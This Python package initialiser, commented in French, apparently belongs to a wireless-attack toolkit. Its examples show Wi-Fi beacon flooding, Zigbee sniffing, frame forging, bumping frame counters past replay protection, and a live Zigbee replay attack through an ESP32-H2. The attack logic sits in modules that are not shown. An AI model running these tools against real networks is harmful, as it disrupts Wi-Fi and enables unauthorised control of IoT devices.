"""
.. include:: ../README.md
"""
"""
Fichier d'initialisation qui permet d'importer les classes et les fonctions pour les tester avec des exemples.
"""

from beaconSpam  import *
from CodeurTrame import *
from DecodeurTrame import *
from replay import *
from sniff import *


'''
#Exemple Beacon Spam
if __name__ == "__main__":
    """
    Exemple d'utilisation de WifiSpammer pour envoyer des paquets Beacon sur le canal 1.
    """
    scanner = WifiSpammer(interface="wlp1s0", channel=1)
    scanner.start_scan(num_sender_threads=30)


#Exemple Sniff
def main():
    sniff = SniffeurZigbee(
        canal=13,
    )
    sniff.demarrer_sniffer()
    time.sleep(5)
    sniff.arreter_sniffer()
    sniff.sauvegarder_captures()
if __name__ == "__main__":
    main()
'''

'''
#Exemple DecodeurTrame
def main():
    trame_data = bytes.fromhex("6188300019146e0000481a146e00001e222f3c60feffbd4d749e2860feffbd4d7428247002009e2860feffbd4d74005ca080848585055c298eab1c1c9f41") 
    decoder = DecodeurTrameZigbee()
    with open('captures_zigbee.json', 'w') as f:
        json.dump(decoder.decoder_trame_zigbee(trame_data), f, indent=2)


if __name__ == "__main__":
    main()

'''


'''
# Exemple d'utilisation Trame Data avec CodeurTrame



codeur = CodeurTrameZigbee()

champs = {
    'type_trame': 'Data',
    'couche_mac': {
        'controle_trame': {
            'frame_type': 0x3,
            'securite_activee': 0,
            'trame_en_attente': 0,
            'ack_requis': 1,
            'compression_pan_id': 1,
            'version_trame': 0,
            'mode_adresse_dst': 2,
            'mode_adresse_src': 2
        },
        'numero_sequence': 44,
        'pan_id_destination': '1900',
        'adresse_destination': 'FFFF',
        'adresse_source': '0000'
    },
    'couche_reseau': {
        'champ_controle_reseau': '08',
        'addr_dest': 'FFFF',
        'addr_src': '0000',
        'radius': 30,
        'sequence_number': 44,
        'adresse_destination': 'FFFF',
        'extended_source': '0000'
    },
    'security_header': {
        'extended_nonce': '01',
        'frame_counter': '0000000000000000',
        'extended_source': '0000',
        'key_sequence_number': 0
    },
    'payload': '11223344'
}

trame = codeur.encoder_trame_zigbee(champs)

print(trame.hex())
'''

'''
# Test avec la trame fournie
def main():
    trame = "6188d07d90ffff0000481affff00001e0ea13260feffbd4d749e2860feffbd4d7428100400009e2860feffbd4d74001e16470acdb56e9fa063520ceb175f"
    
    finder = ZigbeeFrameFinder()
    
    print("=== Analyse de la trame originale ===")
    finder.analyze_trame(trame)
    
    print("\n=== Incrémentation du Frame Counter ===")
    new_trame = finder.increment_frame_counter(trame, 10)
    finder.analyze_trame(new_trame)

if __name__ == "__main__":
    main()

'''

# Exemple Replay Attack
def main():

    attaque = ZigbeeReplayAttack(
        capture_file='captures_zigbee.json',
        channel=13,
        pan_id=0xf4ef,
        serial_port='/dev/ttyUSB0',
        aes_key=None,
        materiel='esp32h2'
    )
    attaque.lancer_attaque_replay(capture_live=True)

if __name__ == "__main__":
    main() 
